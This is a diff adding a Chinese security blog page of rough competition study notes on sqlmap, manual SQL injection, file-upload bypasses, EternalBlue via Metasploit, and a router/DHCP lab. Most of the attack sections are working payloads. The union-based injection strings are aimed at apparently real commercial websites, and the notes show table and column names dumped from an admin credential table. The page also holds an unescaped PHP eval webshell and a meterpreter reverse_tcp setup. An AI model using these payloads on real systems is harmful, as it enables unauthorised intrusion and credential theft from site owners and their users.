@@ -1,0 +1,640 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>某次比赛草率的学习笔记 | WH-dragon的荒岛</title><meta name="author" content="WH-dragon"><meta name="copyright" content="WH-dragon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sqlmap爆破&amp;手工注入&amp;文件上传&amp;永恒之蓝&amp;路由实验（个人学习笔记摘要）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某次比赛草率的学习笔记">
+<meta property="og:url" content="http://wh-dragon.github.io/2024/10/14/%E6%9F%90%E6%AC%A1%E6%AF%94%E8%B5%9B%E8%8D%89%E7%8E%87%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="WH-dragon的荒岛">
+<meta property="og:description" content="sqlmap爆破&amp;手工注入&amp;文件上传&amp;永恒之蓝&amp;路由实验（个人学习笔记摘要）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://wh-dragon.github.io/img/%E5%A4%B4%E5%83%8F.png">
+<meta property="article:published_time" content="2024-10-14T05:00:00.000Z">
+<meta property="article:modified_time" content="2024-10-14T08:46:17.449Z">
+<meta property="article:author" content="WH-dragon">
+<meta property="article:tag" content="学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://wh-dragon.github.io/img/%E5%A4%B4%E5%83%8F.png"><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="http://wh-dragon.github.io/2024/10/14/%E6%9F%90%E6%AC%A1%E6%AF%94%E8%B5%9B%E8%8D%89%E7%8E%87%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '某次比赛草率的学习笔记',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-10-14 16:46:17'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/%E5%A4%B4%E5%83%8F.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/%E5%A4%B4%E9%83%A8%E5%9B%BE.png')"><nav id="nav"><span id="blog-info"><a href="/" title="WH-dragon的荒岛"><span class="site-name">WH-dragon的荒岛</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">某次比赛草率的学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-14T05:00:00.000Z" title="发表于 2024-10-14 13:00:00">2024-10-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-14T08:46:17.449Z" title="更新于 2024-10-14 16:46:17">2024-10-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="某次比赛草率的学习笔记"><a href="#某次比赛草率的学习笔记" class="headerlink" title="某次比赛草率的学习笔记"></a>某次比赛草率的学习笔记</h3><h4 id="第一课：sqlmap爆破"><a href="#第一课：sqlmap爆破" class="headerlink" title="第一课：sqlmap爆破"></a>第一课：sqlmap爆破</h4><p>渗透测试：Web渗透，软件渗透</p>
+<p>Web渗透（即对网站进行渗透）：sql注入，文件操作，反序列化，xxs&#x2F;scrf&#x2F;ssrf，逻辑漏洞</p>
+<p> sql注入:——&gt;数据库</p>
+<p>数据库：dvwa(库) –&gt; user(表单) –&gt;字段（用来描述数据）</p>
+<p>select * from users ; </p>
+<p>*:所有 </p>
+<p>select：查询 </p>
+<p>from：来自</p>
+<p>users：表名</p>
+<p>select * from users where user &#x3D; ‘admin’; </p>
+<p>where:对我们的查询结果进⾏⼀个塞选，以字段为塞选条件</p>
+<p><a target="_blank" rel="noopener" href="http://www.sungrain.cn/news_show.php?id=3%EF%BC%88%E5%8F%82">http://www.sungrain.cn/news_show.php?id=3（参</a> 数）（url：统一资源定位符）</p>
+<p>http:协议 </p>
+<p><a href="http://www.sungrain.cn：域名">www.sungrain.cn：域名</a> </p>
+<p>&#x2F;nes_show.php:⽹站源代码</p>
+<p>简单的判断是否有sql注入漏洞：（从数据库角度理解原理）</p>
+<p><a target="_blank" rel="noopener" href="http://www.sungrain.cn/news_show.php?id=3%27%EF%BC%88%E2%BC%80">http://www.sungrain.cn/news_show.php?id=3&#39;（⼀</a> 定要用英文的单引号）</p>
+<p>select * from users where id &#x3D; ‘3’ ; </p>
+<p>字符型：123123 </p>
+<p>数字型：dsada</p>
+<p>select * from users where id &#x3D; ‘ 3’ ‘  ;  </p>
+<p>如果对我们传递的参数没有做限制，没有做修改（不会自动修改我们添加的’)</p>
+<p>1.error……mysql </p>
+<p> 2.空白回显</p>
+<p>sqlmap </p>
+<p>-u:指定url（⼀定要定位到参数）</p>
+<p> –dbs:爆破出所有数据库</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://62.234.58.155:90/AHPKKttxYpuoVtg2CGv87wZwsJEk1GWI/?id=1">http://62.234.58.155:90/AHPKKttxYpuoVtg2CGv87wZwsJEk1GWI/?id=1</a>“ –dbs</p>
+<p> -D:指定数据库 </p>
+<p>–tables：爆破出所有表单 </p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://62.234.58.155:90/AHPKKttxYpuoVtg2CGv87wZwsJEk1GWI/?id=1">http://62.234.58.155:90/AHPKKttxYpuoVtg2CGv87wZwsJEk1GWI/?id=1</a>“ -D message –tables   （其中message为前一步爆破所得的数据库名）</p>
+<p>-T:指定表单 </p>
+<p>–columns:爆破出所有表达下的字段（列） </p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://62.234.58.155:90/AHPKKttxYpuoVtg2CGv87wZwsJEk1GWI/?id=1">http://62.234.58.155:90/AHPKKttxYpuoVtg2CGv87wZwsJEk1GWI/?id=1</a>“ -D message -T user –columns</p>
+<p>-C:指定字段 </p>
+<p>–dump：具体爆破出数据</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://62.234.58.155:90/AHPKKttxYpuoVtg2CGv87wZwsJEk1GWI/?id=1">http://62.234.58.155:90/AHPKKttxYpuoVtg2CGv87wZwsJEk1GWI/?id=1</a>“ -D message -T user -C name –dump</p>
+<p>如果跑两个以上用逗号隔开</p>
+<h4 id="第二课：手工注入"><a href="#第二课：手工注入" class="headerlink" title="第二课：手工注入"></a>第二课：手工注入</h4><p>有时候sqlmap注入不行—waf(wab应用防火墙)</p>
+<p><a target="_blank" rel="noopener" href="http://62.234.58.155:90/TgQ1gAILv13VZVnFobtBUtOVIEooc9a5/?id=3">http://62.234.58.155:90/TgQ1gAILv13VZVnFobtBUtOVIEooc9a5/?id=3</a></p>
+<p>?id&#x3D;3  &#x2F;&#x2F; ? get请求方式  请求id&#x3D;1的数据</p>
+<p>在数据库中执行的SQL语句</p>
+<p>select 列名 from 表名 where id&#x3D;3  如果是int类型</p>
+<p>select 列名 from 表名 where id&#x3D;’3’  如果是char类型</p>
+<p>?id&#x3D;3 and 1&#x3D;1  正确  ？id&#x3D;3 and 1&#x3D;2 错误</p>
+<p>如果有存在数字(int)类型的sql注入，此时显示的结果应该是不一样的</p>
+<p>?id&#x3D;3’ and1&#x3D;1 –+</p>
+<p>?id&#x3D;3’ and1&#x3D;2 –+</p>
+<p>如果两次显示的结果不一样，则存在字符(char)类型的SQL注入</p>
+<p>–+为注释的意思，后面的代码不执行</p>
+<p> select 列名 from 表名 where id&#x3D;’            ‘ 在这里前一个可以配对，后一个被注释</p>
+<p>判断数据表中的列数 order by n</p>
+<p>?id&#x3D;3’ order by 3 –+  </p>
+<p>联合查询</p>
+<p>?id&#x3D;3’ and 1&#x3D;2 union select 1,2,3 –+  此时联合查询前面为假不显示，显示后面的</p>
+<p>查询数据库名</p>
+<p>?id&#x3D;3’ and 1&#x3D;2 union select 1,2,database() –+  查询3这里的数据库名—&gt;message</p>
+<p>查询数据表名</p>
+<p>?id&#x3D;3’ and 1&#x3D;2 union select 1,2,table_name from information_schema.tables where table_schema&#x3D;’message’ limit 0,1–+  查询数据库中的第一张数据表名 user</p>
+<p>查询数据列名</p>
+<p>?id&#x3D;3’ and 1&#x3D;2 union select 1,2,column_name from information_schema.columns where table_name&#x3D;’user’ limit 0,1–+</p>
+<p>查询数据</p>
+<p>?id&#x3D;3’ and 1&#x3D;2 union select user,password from users –+</p>
+<p>数字型的</p>
+<p><a target="_blank" rel="noopener" href="http://www.dlhcal.com/index.php?c=news&a=show&id=130">http://www.dlhcal.com/index.php?c=news&amp;a=show&amp;id=130</a></p>
+<p>判断出数字型的并判断出列数12</p>
+<p>and 1&#x3D;2 union select 1,database(),3,4,5,6,7,8,9,10,11,12<br>and 1&#x3D;2 union select 1,group_concat(TABLE_NAME),3,4,5,6,7,8,9,10,11,12  from information_schema.tables where table_schema&#x3D;’qdm178021325_db’<br>and 1&#x3D;2 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12  from information_schema.columns where table_name&#x3D;’admin’<br>and 1&#x3D;2 union select 1,group_concat(username,password),3,4,5,6,7,8,9,10,11,12 from admin</p>
+<p>注释绕过</p>
+<p>&#x2F;*&amp;id&#x3D;197’ order by 32 –+ <em>&#x2F;<br>&#x2F;</em>&amp;id&#x3D;197’ and 1&#x3D;2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 –+ *&#x2F;</p>
+<p>2 4 14 8<br>&#x2F;*&amp;id&#x3D;197’ and 1&#x3D;2 union select 1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 –+ *&#x2F;</p>
+<p>sq_pcbprinter<br>&#x2F;*&amp;id&#x3D;197’ and 1&#x3D;2 union select 1,group_concat(TABLE_NAME),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 from information_schema.tables where table_schema&#x3D;’sq_pcbprinter’ –+ *&#x2F;</p>
+<p>api_ticket,chengshibiao,code,daijinquanlist,dati,dati_jilu,dati_jsyd,dati_linshi,dati_user,dati_xuanxiang,dhinfo,diaoyan,dingdan,dingdanxiangqing,ejlise,erweima,guanzhu,help,ht_dianzan,ht_dynamic,ht_lise,ht_pinlun,ht_zhifu,huilv,huiyuan,huodong,jilu,ka,kefu,kfhuihua,kfliedui,kflog,leibie,liaotian,linshi,log,ma,ma_copy,manage,mendian,menuse</p>
+<p>&#x2F;*&amp;id&#x3D;197’ and 1&#x3D;2 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 from information_schema.columns where table_name&#x3D;’manage’ –+ *&#x2F;</p>
+<p>id,tname,name,pwd,dengji,tel,addtime,act,endtime,rncpsd,endip,zimu,ma,mas</p>
+<p>&#x2F;*&amp; id&#x3D;197’ and 1&#x3D;2 union select 1,group_concat(name,pwd),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 from manage –+ *&#x2F;</p>
+<p>LOW<br>1 判断是否存在注入<br>1’ and ‘1’&#x3D;’1  查询成功，说明存在字符型注入<br>1’ and 1 order by 1,2# 拆解SQL查询语句中的字段数 1’ and 1 order by 1,2,3,4#(二分法)<br>1’ union select 1,2#   显示字段顺序<br>1’ union select 1,database()#   获取数据库<br>1’ union select 1,table_name from information_schema.tables where table_schema&#x3D;database()# 获取数据可中的表<br>1’ union select 1,column_name from information_schema.columns where table_name&#x3D;’users’# 获取表中字段</p>
+<p>1’ union select user,password from users# 最后查询数据</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>思考，你想成为一位Web选手还是PWN选手</p>
+<p>线下赛一定多看别人的Writeup（WP），因为对WP的学习才是最迅速的提升方式</p>
+<h4 id="第三课：文件上传"><a href="#第三课：文件上传" class="headerlink" title="第三课：文件上传"></a>第三课：文件上传</h4><p>文件上传</p>
+<p>网站 数据库 前端(html css javascript) 后端(asp php python java go)</p>
+<p>Linux操作系统的基本命令 </p>
+<p>cd change directory </p>
+<p>ls list</p>
+<p>rm remove rm -f force</p>
+<p>木马</p>
+<p>小马 一句话木马</p>
+<?PHP @eval($_POST['1']); ?><p> 需要木马连接工具 蚁剑 留后门</p>
+<p>大马 代码量比较大 一般是有经过特殊处理 编码 加密</p>
+<p>图片马 把木马隐藏在图片里</p>
+<p>安全等级Medium </p>
+<p>Your image was not uploaded. We can only accept JPEG or PNG images.</p>
+<p>检查 绕过<br>白名单<br>黑名单 检查文件的类型(MIME类型)、检查文件的后缀、检查文件的大小、检查文件的内容</p>
+<p>burpsuite 作为浏览器的代理软件</p>
+<p>拦截、抓包、改包、重发</p>
+<p>抓包抓到的文件类型<br>Content-Type: image&#x2F;jpeg 图片文件<br>Content-Type: application&#x2F;octet-stream php文件</p>
+<p>前端过滤：<br>通过burpsuite抓包，还没抓到包，就提示有过滤了的 为前端过滤</p>
+<p>绕过：把本地的php文件改为合法的文件（jpg、png）后缀，然后上传抓包，抓到包之后，通过burpsuite修改文件的后缀名，然后放行。</p>
+<p>后端过滤：<br>通过burp suite抓包，抓到包，放行的时候才提示有过滤</p>
+<p>简单的前端或者后端的绕过方法：<br>1、多个后缀的方式 .jpg.php</p>
+<p>2、特殊的后缀php5</p>
+<p>3、mime类型过滤</p>
+<p>Content-Type: image&#x2F;jpeg jpg</p>
+<p>Content-Type: application&#x2F;octet-stream php</p>
+<h4 id="第四课：永恒之蓝"><a href="#第四课：永恒之蓝" class="headerlink" title="第四课：永恒之蓝"></a>第四课：永恒之蓝</h4><p>Ms17-010</p>
+<p>攻击目标 445 ：smb邮件服务</p>
+<p>1 打开 :    <strong>msfconsole</strong></p>
+<p>附：使用auxiliary模块进行信息收集，确认系统是否存在MS17_010漏洞</p>
+<p>msf6 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010  </p>
+<p>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; show options</p>
+<p>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.112.129<br>rhosts &#x3D;&gt; 192.168.112.129<br>msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run</p>
+<p>可以看出<em><strong>”Host is likely VULNERABLE to MS17-010!”</strong></em><br>说明，这里先对扫描到的IP地址为192.168.112.129进行渗透</p>
+<p>2 搜索 ms17-010 代码：<strong>search ms17_010</strong></p>
+<p>这里有个check，check下面有yes或no这些标明，表示了这些的模块还能不能用</p>
+<p>3 使用这个模块，use   加上我们搜索出来的前面的数字 或  模块的名字</p>
+<p><strong>use 0</strong></p>
+<p>4 看这个模块，它都要我们去填哪些参数   <strong>show options</strong></p>
+<p>发现需要输入</p>
+<p>1）RHOSTS(rhosts) 即远程攻击目标的IP地址  192.168.112.129 ipconfig这个是看windows IP地址的一个命令</p>
+<p>2）LHOST(lhost) 即本地的IP地址  192.168.112.128 ifconfig这个是看linux IP地址的一个命令</p>
+<p>3）LPORT(lport) 即本地连接的端口 （每个端口下都有一个服务,具有唯一性）已有默认4444不必理会</p>
+<p>4）payload(攻击载荷)(回联)：以什么样的方式来接收到他对方的终端命令行</p>
+<p>这里用的是 windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>meterprete 伪终端 功能和cmd终端一样 msf自己做的一个终端，用来接收的，也可以进行我们的命令交互</p>
+<p>cmd 终端（翻译器，帮我们把命令转换成计算机看得懂的语言也就是二进制）</p>
+<p>一个windows和linux共用的一个命令，叫ping这个命令可以检测两个设备，它是否能交互</p>
+<p>ping 192.168.112.129 </p>
+<p>交互成功：</p>
+<p>64 bytes from 192.168.112.129: icmp_seq&#x3D;1 ttl&#x3D;128 time&#x3D;2.16 ms<br>64 bytes from 192.168.112.129: icmp_seq&#x3D;2 ttl&#x3D;128 time&#x3D;0.675 ms<br>64 bytes from 192.168.112.129: icmp_seq&#x3D;3 ttl&#x3D;128 time&#x3D;1.63 ms</p>
+<p>5 要往这个模块里面填入参数和攻击载荷 命令set</p>
+<p><strong>set rhosts 192.168.112.129</strong> </p>
+<p><strong>set lhost 192.168.112.128</strong></p>
+<p>&#x2F;&#x2F;<strong>use 0</strong></p>
+<p>&#x3D;&#x3D;》Using configured payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp 复制</p>
+<p><strong>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</strong></p>
+<p><strong>run</strong></p>
+<p>This module only supports x64 (64-bit) targets可以看出这个攻击模块不适用与该目标主机，原因：目标主机是32位，但module适应64位</p>
+<p>使用 use 1&#x3D;&#x3D;&gt; Unable to find accessible named pipe!可以看出这个攻击模块并未成功实现渗透</p>
+<p>发现我用的是32位，换成64位</p>
+<p>出现Host does NOT appear vulnerable</p>
+<p>问题很简单，就是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E9%9D%B6%E6%9C%BA&spm=1001.2101.3001.7020">靶机</a>还不够“脆弱”，那么我们需要检查一下靶机的防护手段是否全部关闭</p>
+<p>检查靶机（win7）的防火墙是否关闭 </p>
+<p>检查是否开启远程连接 控制面板》系统和安全》系统，左边那一栏点击远程设置，选择允许任意版本远程桌面</p>
+<p>6 出现win这个界面的话，说明你的攻击成功，进入meterpreter模块</p>
+<p>shell 进入终端命令行</p>
+<p>chcp 65001 切换编码格式</p>
+<p>kali提权 <strong>sudo su</strong>  回车 输入密码kali</p>
+<p>administrator:Windows的管理员用户名</p>
+<p>root：Linux的管理员用户名</p>
+<p>7 关闭445端口</p>
+<p>控制面板 系统和安全 Windows防火墙 入站规则 新建规则</p>
+<h4 id="第五课：路由实验"><a href="#第五课：路由实验" class="headerlink" title="第五课：路由实验"></a>第五课：路由实验</h4><p>网段（Subnet）：网段是IP网络的一个子集，它通过子网掩码从更大的网络中划分出来。网段允许网络管理员更有效地管理网络流量和改善网络性能。</p>
+<p>网关（Gateway）：网关是连接两个不同网络的设备或系统，它会在数据包从一个网络传送到另一个网络时进行路由选择。网关可以是路由器、防火墙或专门配置的服务器。</p>
+<p>路由器（Router）：路由器是一种网络设备，用于连接多个逻辑上分开的网络。它会根据IP地址决定数据包的最佳路径，将数据从一个网络传送到另一个网络。</p>
+<p>交换机（Switch）：交换机是一种网络设备，用于在计算机网络内部连接设备，如计算机、网络打印机等。与路由器不同，交换机工作在OSI模型的第二层（数据链路层），主要处理MAC地址，而不是IP地址。</p>
+<p>IP（Internet Protocol）：互联网协议是一套规则，定义了数据如何在网络中从一个设备传输到另一个设备。每个连接到网络的设备都需要有一个唯一的IP地址，以便进行通信。</p>
+<p>DHCP（Dynamic Host Configuration Protocol）：动态主机配置协议是一种网络协议，它允许服务器自动向客户端分配IP地址和配置信息，如子网掩码、网关等。这简化了网络管理，因为不需要手动为每个设备配置这些参数。</p>
+<p>DNS（Domain Name System）：域名系统是将易于记忆的域名（如 <a target="_blank" rel="noopener" href="http://www.example.com)转换为ip地址的分布式数据库.dns使得用户可以通过域名而不是ip地址来访问网络上的资源./">www.example.com）转换为IP地址的分布式数据库。DNS使得用户可以通过域名而不是IP地址来访问网络上的资源。</a></p>
+<p>NAT（Network Address Translation）：网络地址转换是一种技术，它允许一个本地网络中的多个设备共享一个公共IP地址访问互联网。NAT通过在数据包离开本地网络时修改其源IP地址来实现这一点。</p>
+<p>VPN（Virtual Private Network）：虚拟私人网络是一种网络技术，它可以在公共网络上创建一个安全的、加密的网络连接。VPN常用于远程访问内部网络资源，确保数据传输的安全性。</p>
+<p>防火墙（Firewall）：防火墙是一种网络安全系统，它监控和控制进出网络的数据流。防火墙可以根据预设的安全规则允许或拒绝数据包的传输，以保护网络不受未经授权的访问和攻击。</p>
+<p>MAC地址（Media Access Control Address）：MAC地址是网络接口卡（NIC）在数据链路层上用于标识网络设备的唯一硬件地址。MAC地址通常被烧录在网络设备的固件中。</p>
+<p>子网掩码（Subnet Mask）：子网掩码是一个32位的二进制数字，用于将IP地址分为网络地址和主机地址。它与IP地址结合使用，以确定哪些位属于网络部分，哪些位属于主机部分。</p>
+<p>OSI模型（Open Systems Interconnection Model）：OSI模型是一个理论框架，用于理解和设计网络体系结构。它将网络通信过程分为七个不同的层次，每层负责不同的功能，从物理传输到应用层的数据表示。</p>
+<p>TCP&#x2F;IP模型（Transmission Control Protocol&#x2F;Internet Protocol Model）：TCP&#x2F;IP模型是互联网的基础通信协议套件。它是一个四层模型，包括网络接口层、互联网层（IP）、传输层（TCP或UDP）和应用层。</p>
+<p>端口（Port）：在网络中，端口是用于区分不同网络服务的逻辑地址。它们允许一台计算机同时提供多种服务，如Web服务（端口80）、邮件服务（端口25）等。</p>
+<p>SSL&#x2F;TLS（Secure Sockets Layer&#x2F;Transport Layer Security）：SSL和TLS是安全协议，用于在互联网上提供加密通信。它们广泛应用于Web浏览器和服务器之间，以确保数据传输的安全性和隐私。</p>
+<p><strong>实验</strong></p>
+<p>单臂路由 DHCP 划分VLAN</p>
+<p>路由器 交换机 PC端</p>
+<p>连接 路由器和交换机 直通线 </p>
+<p>先配置路由器 电脑连接Console接口</p>
+<p>打开SecureCRT 左上小闪电 Protocol选择Serial 然后Port选择USB 最后Baud rate选择9600 </p>
+<p>show interfaces 查看接口名 </p>
+<p>提权:en<br>进入配置模式:config<br>R1(config)#int f0&#x2F;0</p>
+<p>R1(config-if)#no shutdown 需要将物理接口先打开,否则不能配物理地址</p>
+<p>R1(config-if)#ex</p>
+<p>R1(config)#int f0&#x2F;0.10   创建一个虚拟子接口（单臂路由）</p>
+<p>R1 (config-subif)#encapsulation dot1Q 10 这个必须配置,用来匹配和剥离VLAN标签</p>
+<p>R1(config-subif)#ip address 192.168.10.254 255.255.255.0 配置IP地址</p>
+<p>dhcp(分配ip地址)具体配置:</p>
+<p>R1(config)#ip dhcp pool vlan10 创建地址池</p>
+<p>R1(dhcp-config)#network 192.168.10.0 255.255.255.0 该DHCP下发IP地址的范围</p>
+<p>R1(dhcp-config)#default-router 192.168.10.254 网关(用来与不同网段通信)</p>
+<p>R1(dhcp-config)#dns-server 8.8.8.8  DNS(域名解析)</p>
+<p>R1(dhcp-config)#ex</p>
+<p>实操</p>
+<p>Continue with configuration dialog? [yes&#x2F;no]: <strong>no</strong></p>
+<p>Press RETURN to get started!</p>
+<p>Router&gt;<strong>show interfaces</strong></p>
+<p><code>**GigabitEthernet0/0 is administratively down, line protocol is down (disabled)**</code></p>
+<p>……………..</p>
+<p><code>**GigabitEthernet0/1 is administratively down, line protocol is down (disabled)**</code></p>
+<p>…………………………….</p>
+<p><strong>注意实操要写全名</strong></p>
+<p>Router&gt;<strong>en</strong></p>
+<p>Router#<strong>config</strong></p>
+<p>Configuring from terminal, memory, or network [terminal]? </p>
+<p>Enter configuration commands, one per line.  End with CNTL&#x2F;Z.</p>
+<p>Router(config)#<strong>int Gig0&#x2F;0</strong>  <strong>注意实操要写全名</strong></p>
+<p>Router(config-if)#<strong>no shutdown</strong></p>
+<p>Router(config-if)#<strong>ex</strong></p>
